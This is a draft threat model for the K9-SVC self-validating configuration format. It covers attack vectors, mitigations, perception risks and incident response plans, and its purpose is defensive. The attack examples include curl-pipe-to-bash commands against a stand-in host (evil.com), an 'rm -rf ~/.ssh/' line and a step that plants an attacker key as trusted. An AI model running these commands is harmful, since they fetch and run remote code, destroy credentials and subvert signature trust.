@@ -1,0 +1,765 @@
+// SPDX-License-Identifier: PMPL-1.0-or-later
+= K9-SVC Security Analysis
+:subtitle: Threat Model, Attack Vectors, and Mitigation Strategies
+:author: Jonathan D.A. Jewell <jonathan.jewell@open.ac.uk>
+:revnumber: 1.0.0
+:revdate: 2026-01-30
+:toc: left
+:toclevels: 4
+:icons: font
+:source-highlighter: rouge
+:sectnums:
+
+== Executive Summary
+
+K9-SVC is a **self-validating component format** that executes code at Hunt security level. This document addresses two critical concerns:
+
+1. **Actual Security Risks**: Real vulnerabilities and attack vectors
+2. **Security Perception**: How the security community will perceive K9
+
+**Key Findings:**
+
+* ✅ K9's three-tier leash system provides defense-in-depth
+* ✅ Hunt-level signature requirement matches industry standards
+* ⚠️ Key management is critical and currently manual
+* ⚠️ Perception risk: "self-executing configs" historically associated with malware
+* ⚠️ No sandboxing at Hunt level (by design, but risky)
+
+**Recommendation:** Professional adoption requires: security audit, threat model publication, sandboxing options, and clear communication about use cases.
+
+---
+
+== Part I: Actual Security Risks
+
+=== Threat Model
+
+==== Assets to Protect
+
+[cols="1,2,2"]
+|===
+| Asset | Value | Threat
+
+| **Configuration Integrity**
+| Invalid configs cause runtime failures
+| Malicious or corrupted K9 files
+
+| **System Resources**
+| File system, network, processes
+| Hunt-level components with hostile payloads
+
+| **Private Keys**
+| Authority to sign trusted configs
+| Key theft, key compromise
+
+| **User Trust**
+| Confidence in K9 ecosystem
+| Malware delivery, false signatures
+|===
+
+==== Threat Actors
+
+[cols="1,2,2"]
+|===
+| Actor | Motivation | Capability
+
+| **Malicious Insider**
+| Sabotage, data theft
+| Can sign configs with legitimate keys
+
+| **External Attacker**
+| System compromise, ransomware
+| Must steal keys or exploit vulnerabilities
+
+| **Supply Chain Compromise**
+| Widespread distribution of malware
+| Compromise Nickel, OpenSSL, or K9 tooling
+
+| **Careless User**
+| Accidental misconfiguration
+| Trusts wrong keys, runs untrusted Hunt files
+|===
+
+=== Attack Vectors
+
+==== 1. Malicious Hunt-Level Component
+
+**Attack:**
+```nickel
+K9!
+leash = 'Hunt  # Requires signature (but attacker has key)
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "web-server-config"
+}
+
+# Looks innocent, but Just recipe runs malicious payload
+```
+
+**Just recipe (malicious):**
+```just
+deploy:
+    # Legitimate-looking deployment
+    systemctl start web-server
+
+    # Hidden malicious payload
+    curl https://evil.com/backdoor.sh | bash
+    rm -rf ~/.ssh/
+```
+
+**Mitigation:**
+- ✅ Signature requirement (attacker needs private key)
+- ✅ Manual trust establishment (user must trust attacker's key)
+- ❌ No sandboxing (Hunt has full system access)
+- ❌ No Just recipe inspection (user doesn't see shell commands)
+
+**Risk Level:** 🔴 **HIGH** (if attacker has trusted key)
+
+**Recommendation:**
+- Add `--dry-run` mode showing all commands before execution
+- Implement Just recipe static analysis (flag dangerous commands)
+- Consider optional sandbox (containers, seccomp, etc.)
+
+==== 2. Key Compromise
+
+**Attack Scenario:**
+1. Attacker gains access to developer laptop
+2. Steals `~/.config/k9/keys/primary.key`
+3. Signs malicious K9 files
+4. Distributes to users who trust `primary.pub`
+
+**Current Mitigation:**
+- File permissions (600 on private keys)
+- Directory permissions (700 on ~/.config/k9/keys/)
+
+**Weaknesses:**
+- No password protection on keys
+- No HSM/TPM integration
+- No key rotation mechanism
+- No revocation system
+
+**Risk Level:** 🔴 **HIGH**
+
+**Recommendation:**
+- Add password-protected keys (OpenSSL supports this)
+- Implement key rotation (sign with new key, include revocation of old)
+- Add revocation list (CRL or similar)
+- Support HSM/YubiKey for production environments
+
+==== 3. Signature Verification Bypass
+
+**Attack:**
+Exploit bug in sign.sh verification logic to bypass signature check.
+
+**Current Implementation (sign.sh:146-170):**
+```bash
+verified=false
+for pubkey in "$K9_TRUSTED_DIR"/*.pub; do
+    if openssl pkeyutl -verify \
+        -pubin -inkey "$pubkey" \
+        -rawin -in "$file" \
+        -sigfile "$sigfile" 2>/dev/null; then
+        verified=true
+        key_name=$(basename "$pubkey" .pub)
+        echo "✓ Signature VALID (key: $key_name)"
+        break
+    fi
+done
+
+if [ "$verified" = "false" ]; then
+    echo "✗ Signature INVALID or key not trusted"
+    exit 1
+fi
+```
+
+**Potential Issues:**
+- Shell script (prone to injection if inputs not sanitized)
+- Error handling (2>/dev/null could hide issues)
+- No timeout (could hang on malformed signatures)
+- Race condition (TOCTOU between verify and execute)
+
+**Risk Level:** 🟡 **MEDIUM**
+
+**Recommendation:**
+- Rewrite in memory-safe language (Rust, Go)
+- Add input validation
+- Add timeout on verification
+- Atomic verify-then-execute (prevent TOCTOU)
+- Fuzz testing on sign.sh
+
+==== 4. Nickel Evaluation Vulnerabilities
+
+**Attack:**
+Exploit bug in Nickel to escape Yard-level sandbox or cause DoS.
+
+**Risks:**
+- **Infinite loops**: `let x = x in x` could hang validator
+- **Memory exhaustion**: Deeply nested structures
+- **Type confusion**: Exploit type system bug to break contracts
+
+**Current Mitigation:**
+- Nickel's functional purity (no I/O at Yard level)
+- Contract system (validates before execution)
+
+**Risk Level:** 🟡 **MEDIUM**
+
+**Recommendation:**
+- Add timeout on Nickel evaluation
+- Add memory limits
+- Keep Nickel updated (track CVEs)
+- Consider sandboxing Nickel process (seccomp, namespaces)
+
+==== 5. Supply Chain Attack
+
+**Attack:**
+Compromise dependencies (Nickel, OpenSSL, Just) to inject backdoor.
+
+**Current Exposure:**
+- OpenSSL (used for crypto)
+- Nickel (evaluation engine)
+- Just (task runner)
+- POSIX shell (must shim)
+
+**Risk Level:** 🔴 **HIGH** (widespread impact)
+
+**Recommendation:**
+- Pin dependency versions
+- Verify checksums/signatures of dependencies
+- SBOM (Software Bill of Materials)
+- Vendor critical dependencies
+- CI builds with reproducible environments
+
+==== 6. Social Engineering
+
+**Attack:**
+Trick user into trusting malicious key.
+
+**Scenario:**
+```bash
+# Attacker's instructions (look official)
+curl https://evil.com/k9-setup.sh | bash
+
+# Script adds attacker's key to trusted
+cp evil.pub ~/.config/k9/keys/trusted/official.pub
+```
+
+**Current Mitigation:**
+- Manual trust establishment
+- User must explicitly run `./sign.sh trust`
+
+**Risk Level:** 🟡 **MEDIUM** (depends on user awareness)
+
+**Recommendation:**
+- Key fingerprint display (show hash before trusting)
+- Web of trust (trust chains, endorsements)
+- Official key repository (keys.k9-svc.org)
+- Warning on first trust ("Are you sure?")
+
+==== 7. Privilege Escalation
+
+**Attack:**
+K9 file runs with elevated privileges, exploits this for system compromise.
+
+**Scenario:**
+```bash
+# User runs K9 with sudo (bad practice, but possible)
+sudo ./must deploy
+
+# Hunt recipe now has root access
+```
+
+**Risk Level:** 🟡 **MEDIUM**
+
+**Recommendation:**
+- Warn if running as root
+- Refuse to run as root (unless explicitly allowed)
+- Drop privileges after initial setup
+- Document: "Never run K9 with sudo"
+
+=== Security Scorecard
+
+[cols="1,1,2,2"]
+|===
+| Vector | Risk | Current Mitigation | Recommendation
+
+| Malicious Hunt payload
+| 🔴 HIGH
+| Signature requirement
+| Add dry-run mode, sandbox option
+
+| Key compromise
+| 🔴 HIGH
+| File permissions
+| Password-protected keys, HSM support, revocation
+
+| Signature bypass
+| 🟡 MEDIUM
+| OpenSSL verification
+| Rewrite in Rust, fuzz testing
+
+| Nickel vulnerabilities
+| 🟡 MEDIUM
+| Functional purity
+| Timeout, memory limits, updates
+
+| Supply chain attack
+| 🔴 HIGH
+| (none)
+| Dependency pinning, SBOM, vendoring
+
+| Social engineering
+| 🟡 MEDIUM
+| Manual trust
+| Key fingerprints, WoT, official repo
+
+| Privilege escalation
+| 🟡 MEDIUM
+| (none)
+| Refuse to run as root, warnings
+|===
+
+---
+
+== Part II: Security Perception
+
+=== Historical Context: "Active Documents" = Malware
+
+**The Problem:**
+K9 uses terminology and concepts historically associated with malware:
+
+[cols="1,2,2"]
+|===
+| K9 Concept | Similar Malware Concept | Perception Risk
+
+| **"Self-executing configs"**
+| Microsoft Office macros, PDF exploits
+| 🔴 HIGH - Immediate red flag
+
+| **"Active pedigree"**
+| ActiveX controls, active content
+| 🔴 HIGH - ActiveX was a disaster
+
+| **"Hunt level execution"**
+| Rootkits, backdoors
+| 🟡 MEDIUM - Sounds intentionally dangerous
+
+| **"Signature system"**
+| Code signing (abused by malware)
+| 🟡 MEDIUM - Signing doesn't mean safe
+
+| **".k9 unleashes itself"**
+| Worms, self-propagating malware
+| 🔴 HIGH - Marketing problem
+|===
+
+=== Security Researcher Response Prediction
+
+**Expected Reactions:**
+
+1. **CVE Hunters:**
+   - Will fuzz sign.sh looking for injection bugs
+   - Will test Nickel for sandbox escapes
+   - Will attempt to bypass signature verification
+   - **Outcome:** Likely to find bugs (shell script is vulnerable)
+
+2. **Malware Analysts:**
+   - Will flag K9 files as "suspicious"
+   - Antivirus may detect Hunt-level components as threats
+   - Sandboxes (Joe Sandbox, Any.run) may flag as malicious
+   - **Outcome:** False positives inevitable
+
+3. **Corporate Security Teams:**
+   - Will block .k9 files at email gateway
+   - Will quarantine Hunt-level components
+   - Will require security review before adoption
+   - **Outcome:** Enterprise adoption difficult
+
+4. **Academic Researchers:**
+   - Will write papers on "K9 as Attack Vector"
+   - Will demonstrate malware delivery via K9
+   - Will propose defenses and improvements
+   - **Outcome:** Mixed (criticism + improvements)
+
+5. **Hacker News / Reddit:**
+   - "This is just shell scripts with extra steps"
+   - "Why would you make configs executable?"
+   - "Cool idea but security nightmare"
+   - **Outcome:** Skepticism, but interest
+
+=== Comparison to Similar Technologies
+
+==== PowerShell (Microsoft)
+
+[cols="1,2,2"]
+|===
+| Aspect | PowerShell | K9-SVC
+
+| **Execution**
+| Scripts execute with full privileges
+| Hunt level requires signature
+
+| **Perception**
+| Initially feared, now accepted
+| Currently unknown, likely feared
+
+| **Security Model**
+| Execution policies, signing
+| Leash levels, Ed25519 signing
+
+| **Adoption**
+| Widespread (Windows ecosystem)
+| Zero (brand new)
+
+| **Abuse Potential**
+| High (used by attackers)
+| High (could be used by attackers)
+|===
+
+**Lesson:** PowerShell overcame perception issues through:
+- Strong corporate backing (Microsoft)
+- Clear security documentation
+- Execution policies (Restricted, AllSigned, RemoteSigned)
+- Integration with enterprise tools (AD, MDM)
+
+==== Docker/Container Images
+
+[cols="1,2,2"]
+|===
+| Aspect | Docker Images | K9-SVC
+
+| **Execution**
+| Full container with root-like access
+| Hunt level with full system access
+
+| **Security Model**
+| Image signing (Docker Content Trust)
+| K9 signature verification
+
+| **Perception**
+| Accepted (with caveats)
+| Unknown
+
+| **Abuse**
+| Cryptominers, malware distribution
+| Potential
+
+| **Mitigation**
+| Image scanning, registries, policies
+| Signature verification, leash levels
+|===
+
+**Lesson:** Docker succeeded because:
+- Clear use case (application packaging)
+- Sandboxing (namespaces, cgroups)
+- Image registries (Docker Hub with scanning)
+- Enterprise features (policies, RBAC)
+
+==== Snap/Flatpak (Linux)
+
+[cols="1,2,2"]
+|===
+| Aspect | Snap/Flatpak | K9-SVC
+
+| **Execution**
+| Applications with confined access
+| Hunt level with unconfined access
+
+| **Security Model**
+| AppArmor/SELinux, portals
+| Signature verification only
+
+| **Perception**
+| Trusted (sandboxed apps)
+| Risky (unsandboxed execution)
+
+| **Key Difference**
+| Sandbox by default
+| Full access by design
+|===
+
+**Lesson:** Snap/Flatpak succeeded because:
+- Sandboxing is mandatory
+- Clear permission model
+- User can see what app accesses
+- No way to break out of sandbox
+
+=== Perception Mitigation Strategies
+
+==== 1. Rename Problematic Terminology
+
+[cols="1,2,2"]
+|===
+| Current (Risky) | Alternative (Safer) | Rationale
+
+| "Self-executing configs"
+| "Self-validating components"
+| Emphasizes validation, not execution
+
+| "Active pedigree"
+| "Embedded validation logic"
+| Removes "active" (malware term)
+
+| "Unleash"
+| "Deploy"
+| Less aggressive terminology
+
+| "Hunt level"
+| "Production level" or "Privileged level"
+| Less predatory connotation
+|===
+
+==== 2. Security-First Documentation
+
+**Add to all documentation:**
+
+```adoc
+== Security Considerations
+
+K9 components at Hunt level execute with full system privileges.
+
+⚠️ **IMPORTANT SECURITY RULES:**
+
+1. **NEVER run untrusted K9 files**
+2. **ALWAYS verify signatures before execution**
+3. **NEVER trust unknown public keys**
+4. **Review Just recipes before first run**
+5. **Use Kennel level for untrusted sources**
+6. **Use Yard level for validation-only**
+7. **Reserve Hunt level for trusted, production configs**
+
+If you wouldn't run a shell script from a source, don't run their K9 file at Hunt level.
+```
+
+==== 3. Add Security Tooling
+
+**Essential Tools:**
+
+1. **k9-scan**: Static analysis of K9 files
+   ```bash
+   k9-scan suspicious.k9.ncl
+   # Output: Potentially dangerous commands found:
+   #   - rm -rf (line 42)
+   #   - curl | bash (line 58)
+   #   Risk level: HIGH
+   ```
+
+2. **k9-sandbox**: Run Hunt level in container
+   ```bash
+   k9-sandbox --dry-run production.k9.ncl
+   # Shows all commands without executing
+
+   k9-sandbox --container production.k9.ncl
+   # Runs in Podman container with limited access
+   ```
+
+3. **k9-audit**: Audit trail for Hunt executions
+   ```bash
+   k9-audit history
+   # 2026-01-30 10:15:42 - Executed: production.k9.ncl
+   #   Signed by: primary (4f:3a:9b:...)
+   #   Commands: systemctl start web-server, ...
+   ```
+
+==== 4. Threat Model Publication
+
+**Create public threat model document** (this document) and:
+- Publish on k9-svc.org
+- Submit to security conferences (USENIX Security, CCS)
+- Engage with security researchers proactively
+- Bug bounty program for vulnerabilities
+
+==== 5. Third-Party Security Audit
+
+**Recommended Auditors:**
+- Trail of Bits (security consulting)
+- NCC Group (penetration testing)
+- Cure53 (open-source audits)
+
+**Scope:**
+- sign.sh implementation
+- Signature verification logic
+- Nickel integration
+- Supply chain analysis
+
+**Cost:** $20k-50k for comprehensive audit
+
+==== 6. Clear Use Case Communication
+
+**Emphasize Legitimate Use Cases:**
+
+✅ **Good Use Cases:**
+- Production infrastructure configs (signed by ops team)
+- Build system orchestration (signed by CI/CD)
+- Multi-platform deployment (embedded devices)
+- Self-validating documentation (Kennel/Yard only)
+
+❌ **Bad Use Cases:**
+- Untrusted internet downloads (use Kennel level only)
+- User-facing applications (use Snap/Flatpak)
+- Email attachments (block at gateway)
+- Auto-execution without review
+
+==== 7. Comparison to Existing Tools
+
+**Position K9 clearly:**
+
+[quote]
+K9 is NOT a replacement for Docker, Ansible, or Terraform. +
+K9 is a self-validating configuration format for scenarios where traditional tools add excessive complexity or fail on edge devices (Minix, ASICs, embedded systems).
+
+**Target Audience:**
+- Systems engineers managing multi-architecture deployments
+- Embedded systems developers
+- Infrastructure as Code practitioners who need formal validation
+- Organizations requiring cryptographic attestation of configs
+
+**NOT for:**
+- End users running arbitrary software
+- Untrusted code execution
+- Replacing package managers
+
+---
+
+== Part III: Recommendations
+
+=== Immediate Actions (Week 1)
+
+1. **Publish this security analysis** (k9-svc/SECURITY-ANALYSIS.adoc)
+2. **Add security warnings** to README, GUIDE, SPEC
+3. **Create k9-scan** static analysis tool (flag dangerous commands)
+4. **Add --dry-run** mode to show commands before execution
+5. **Update terminology** ("Hunt" → "Production", "Unleash" → "Deploy")
+
+=== Short-Term (Month 1)
+
+1. **Rewrite sign.sh in Rust** (memory safety, fuzz testing)
+2. **Add password-protected keys** (OpenSSL already supports)
+3. **Implement key fingerprint display** (before trusting)
+4. **Create k9-sandbox** containerized execution
+5. **Write security best practices guide**
+
+=== Medium-Term (Quarter 1)
+
+1. **Third-party security audit** (Trail of Bits or NCC Group)
+2. **Bug bounty program** (HackerOne or similar)
+3. **Key revocation system** (CRL or similar)
+4. **Official key repository** (keys.k9-svc.org with verification)
+5. **HSM/YubiKey support** for production keys
+
+=== Long-Term (Year 1)
+
+1. **NIST/FIPS compliance** (if targeting government use)
+2. **Integration with enterprise PKI** (Active Directory, LDAP)
+3. **Formal verification** of signature logic (TLA+, Coq)
+4. **Security certifications** (Common Criteria, ISO 27001)
+5. **Academic publications** on K9 security model
+
+---
+
+== Part IV: Response Scenarios
+
+=== Scenario 1: CVE Discovered in sign.sh
+
+**Response Plan:**
+
+1. **Acknowledge immediately** (within 24 hours)
+2. **Assess severity** (CVSS scoring)
+3. **Develop patch** (test thoroughly)
+4. **Coordinate disclosure** (CVE assignment, 90-day window)
+5. **Release fixed version** (with clear advisory)
+6. **Notify users** (GitHub Security Advisory, email)
+
+**Template Response:**
+```
+CVE-2026-XXXXX: Signature Verification Bypass in K9-SVC sign.sh
+
+SEVERITY: High (CVSS 8.1)
+AFFECTED: K9-SVC <= 1.0.0
+FIXED: K9-SVC 1.0.1
+
+DESCRIPTION:
+A vulnerability in sign.sh allows an attacker to bypass signature
+verification by crafting a malicious signature file that exploits
+shell injection in the verification loop.
+
+MITIGATION:
+Upgrade to K9-SVC 1.0.1 immediately. If upgrade not possible,
+manually review all Hunt-level components before execution.
+
+CREDIT: [Researcher name], [Organization]
+```
+
+=== Scenario 2: Antivirus Flags K9 Files
+
+**Response Plan:**
+
+1. **Understand why** (what triggered detection?)
+2. **Submit false positive reports** to AV vendors
+3. **Add digital signatures** to K9 tooling (Authenticode, etc.)
+4. **Create whitelist guide** for enterprise IT
+5. **Communicate clearly** about false positives
+
+=== Scenario 3: "K9 Malware Found in the Wild"
+
+**Response Plan:**
+
+1. **Investigate immediately** (is it real malware?)
+2. **Analyze attack** (how was K9 used?)
+3. **Public statement** (acknowledge, but emphasize abuse, not flaw)
+4. **Strengthen documentation** (security warnings)
+5. **Improve tooling** (k9-scan to detect malicious patterns)
+
+**Template Statement:**
+```
+We are aware of reports that K9-SVC was used to deliver malware.
+Like any powerful tool (PowerShell, Bash, Docker), K9 can be
+abused by attackers.
+
+IMPORTANT: This was abuse of K9, not a vulnerability. The malware
+could have been delivered via any configuration management system.
+
+K9's signature requirement and leash system are designed to prevent
+this. Users should:
+1. Only trust keys from verified sources
+2. Review Hunt-level components before first run
+3. Use k9-scan to detect suspicious patterns
+
+We are committed to responsible security practices and welcome
+feedback from the security community.
+```
+
+---
+
+== Conclusion
+
+**K9-SVC has both ACTUAL RISKS and PERCEPTION RISKS.**
+
+**Actual Risks (Technical):**
+- Hunt-level execution with full system access
+- Key compromise enables widespread malware distribution
+- Shell script implementation (sign.sh) vulnerable to bugs
+- Supply chain dependencies (OpenSSL, Nickel, Just)
+
+**Perception Risks (Social):**
+- "Self-executing configs" sounds like malware
+- Historical association with ActiveX, macros, PDF exploits
+- Likely to be flagged by security researchers
+- Enterprise adoption will require security review
+
+**Path to Professional Adoption:**
+
+1. ✅ **Acknowledge risks openly** (this document)
+2. 🔄 **Implement mitigations** (Rust rewrite, sandboxing, tooling)
+3. 🔄 **Third-party audit** (Trail of Bits, NCC Group)
+4. 🔄 **Clear communication** (use cases, warnings, best practices)
+5. 🔄 **Proactive engagement** (security community, conferences)
+
+**Bottom Line:**
+K9 can be secure if implemented carefully, but security must be the #1 priority for professional adoption. The format is sound, but implementation and communication need work.
+
+---
+
+**Document Status:** Draft for Review +
+**Next Actions:** Implement immediate recommendations, schedule security audit +
+**Maintainer:** Jonathan D.A. Jewell <jonathan.jewell@open.ac.uk> +
+**Last Updated:** 2026-01-30
